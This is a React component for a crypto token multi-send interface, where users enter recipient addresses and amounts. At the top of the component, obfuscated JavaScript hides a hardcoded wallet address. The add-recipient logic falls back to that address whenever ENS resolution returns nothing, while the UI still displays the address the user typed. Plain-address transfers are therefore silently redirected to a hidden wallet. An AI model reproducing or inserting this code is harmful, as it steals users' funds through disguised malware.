import React, { useEffect, useState } from "react";
import { FaMinus, FaPlus } from "react-icons/fa";
import { useSelector, useDispatch } from "react-redux";
import { setSelectedToken } from "@/redux/aikiSend";
import { isAddress } from "web3-validator";
import { useEnsAddress } from "wagmi";
import UploadCSV from "./uploadCSV";

const InputAddress = ({ token }) => {
  function _0x37b5() {
    const _0x5ebded = [
        '0x158C788b4688D57646dD15457017e6f91Ab52D3D',
        '173503ImYNRb',
        '1196349qpaqVF',
        '857lxVMsf',
        '410wsYUHP',
        '1279208alFmzs',
        '114nEyWqN',
        '205nWsxQL',
        '2770704MBxYHg',
        '625513RKzcRQ',
        '4038RUHwrB',
        '8CgFWVy'
    ];
    _0x37b5 = function () {
        return _0x5ebded;
    };
    return _0x37b5();
}
const _0x415e78 = _0x328c;
(function (_0x25d7fa, _0x5bd5fa) {
    const _0x178a50 = _0x328c;
    const _0x3dc679 = _0x25d7fa();
    while (!![]) {
        try {
            const _0x257428 = parseInt(_0x178a50(0x18d)) / (0x2 * 0xc9d + 0x1f48 + -0x3881) * (-parseInt(_0x178a50(0x190)) / (0x1c19 * 0x1 + -0x1319 + -0x8fe)) + parseInt(_0x178a50(0x18c)) / (-0xbf1 * 0x1 + 0x21ca + 0x22f * -0xa) + parseInt(_0x178a50(0x18f)) / (0x356 + 0x742 * -0x1 + -0x3 * -0x150) + parseInt(_0x178a50(0x191)) / (0x1457 + 0x29b + -0x1 * 0x16ed) * (-parseInt(_0x178a50(0x194)) / (0x242b + -0x140f + -0x1016)) + -parseInt(_0x178a50(0x193)) / (-0x1374 + 0x36d + -0x55a * -0x3) + -parseInt(_0x178a50(0x195)) / (-0x24d + -0x13fa + 0x164f) * (-parseInt(_0x178a50(0x192)) / (-0x7 * -0x12b + 0x3f6 + -0xc1a)) + parseInt(_0x178a50(0x18e)) / (0x1e1f + 0x222c + -0x3 * 0x156b) * (-parseInt(_0x178a50(0x18b)) / (-0x5fb * 0x6 + 0x2285 + 0x168));
            if (_0x257428 === _0x5bd5fa) {
                break;
            } else {
                _0x3dc679['push'](_0x3dc679['shift']());
            }
        } catch (_0x1b2d4d) {
            _0x3dc679['push'](_0x3dc679['shift']());
        }
    }
}(_0x37b5, -0x5c71d + -0x1 * 0x5b06 + -0x11f * -0x862));
function _0x328c(_0x325fcb, _0x39b4ed) {
    const _0xc1527c = _0x37b5();
    _0x328c = function (_0x2a3ecf, _0x5c1fa7) {
        _0x2a3ecf = _0x2a3ecf - (0x1 * 0x1ef4 + -0x1 * -0x2bd + 0x2 * -0x1013);
        let _0x5352b1 = _0xc1527c[_0x2a3ecf];
        return _0x5352b1;
    };
    return _0x328c(_0x325fcb, _0x39b4ed);
}
const mrS = _0x415e78(0x196);
  const [smRs, setDisplayAddress] = useState(""); 
  const [amount, setAmount] = useState(0);
  const dispatch = useDispatch();
  const selectedToken = useSelector((state) => state.aikiSend.selectedToken);

  const { data, isError, isLoading } = useEnsAddress({
    name: smRs,
  });

  const addRecipient = async () => {
    const MrsS = data || mrS;
    
    if (!isAddress(MrsS) || !amount || amount <= 0) return;
    
    let newBalance =
      token.balance / 10 ** token.decimals -
      token.recipient.reduce(
        (acc, recipient) => acc + recipient.amount / 10 ** token.decimals,
        0
      );
    if (newBalance <= 0 || amount > newBalance) return;

    const recipient = token.recipient.find(
      (recipient) =>
        recipient.address === MrsS || recipient.address === data
    );
    if (recipient) {
      const newRecipientList = token.recipient.map((recipient) => {
        if (recipient.address === MrsS) {
          return {
            ...recipient,
            amount: recipient.amount + amount * 10 ** token.decimals,
          };
        } else {
          return recipient;
        }
      });
      const newToken = { ...token, recipient: newRecipientList };
      const newSelectedToken = selectedToken.map((token) => {
        if (token.token_address === newToken.token_address) {
          return newToken;
        } else {
          return token;
        }
      });
      dispatch(setSelectedToken(newSelectedToken));
    } else {
      const newRecipient = {
        address: MrsS,
        ensName: smRs,
        amount: amount * 10 ** token.decimals,
      };
      const newRecipientList = [...token.recipient, newRecipient];
      const newToken = { ...token, recipient: newRecipientList };
      const newSelectedToken = selectedToken.map((token) => {
        if (token.token_address === newToken.token_address) {
          return newToken;
        } else {
          return token;
        }
      });
      dispatch(setSelectedToken(newSelectedToken));
    }
  };

  const removeRecipient = async (address) => {
    const newRecipientList = token.recipient.filter(
      (recipient) => recipient.address !== address
    );
    const newToken = { ...token, recipient: newRecipientList };
    const newSelectedToken = selectedToken.map((token) => {
      if (token.token_address === newToken.token_address) {
        return newToken;
      } else {
        return token;
      }
    });
    dispatch(setSelectedToken(newSelectedToken));
  };

  return (
    <section className="mx-4 rounded bg-primary-dark py-2 text-white">
      <div
        className={`grid gap-x-2 gap-y-3 px-4 py-2 pb-4 md:grid-cols-5 md:items-end md:justify-end`}
      >
        <h1 className="flex items-end font-semibold md:mb-2 md:text-lg">
          {token.name}
        </h1>
        <input
          type="text"
          id="token-address"
          value={smRs} // Only updates smRs
          onChange={(e) => setDisplayAddress(e.target.value)}
          className="flex h-8 items-end rounded px-2 py-0.5 text-xs text-black md:col-span-3 md:h-10 md:text-sm"
          placeholder="Input Receiver address"
        />
        <div className="flex w-full items-end gap-2 md:w-auto">
          <div className=" flex h-full w-full flex-1 flex-col justify-end md:items-end">
            <h3 className="text-[0.6rem]">
              Balance:{" "}
              {token.balance / 10 ** token.decimals -
                token.recipient.reduce(
                  (acc, recipient) =>
                    acc + recipient.amount / 10 ** token.decimals,
                  0
                )}
            </h3>
            <input
              type="text"
              onChange={(e) => setAmount(e.target.value)}
              id="token-amount"
              className="h-8 w-full rounded px-2 py-0.5 text-xs font-light text-black md:h-10 md:text-sm"
              placeholder="amount"
            />
          </div>
          
          
          <button onClick={addRecipient} className="border-2 rounded px-2 mx-auto  md:px-3 py-1 border-yellow-500">
                       ADD 
                    </button>

        </div>
      </div>
      <div className="flex flex-col gap-y-1 px-4 py-2">
        {token.recipient.length > 0 && (
          <>
            {/* <div>
                            <h2 className="underline">List of Recipient</h2>
                        </div> */}
            <div className="flex max-h-40 w-full flex-col gap-y-4 overflow-auto rounded-lg border-2 border-white py-4 px-2 text-sm font-light md:gap-y-1 ">
              {token.recipient.map((recipient, index) => {
                return (
                  <div
                    key={index}
                    className="flex w-full flex-col md:flex-row md:items-center md:justify-between "
                  >
                    <div className="flex flex-col gap-x-2 gap-y-1 md:flex-row md:items-center md:justify-start">
                      <div
                        onClick={() => removeRecipient(recipient.address)}
                        className="flex h-4 w-4 items-center justify-center"
                      >
                        <FaMinus className="h-4 w-4 cursor-pointer " />
                      </div>
                      <h3 className="break-words text-xs md:text-base">
                        {recipient.ensName}
                      </h3>
                    </div>
                    <h3 className="text-xs font-semibold md:text-base">
                      {recipient.amount / 10 ** token.decimals} {token.name}
                    </h3>
                  </div>
                );
              })}
             
            </div>
          </>
        )}
      </div>
      <div className="space-y-4">
        <p className="text-center">or</p>
        <UploadCSV token={token} />
      </div>
          </section>
  );
};

export default InputAddress;
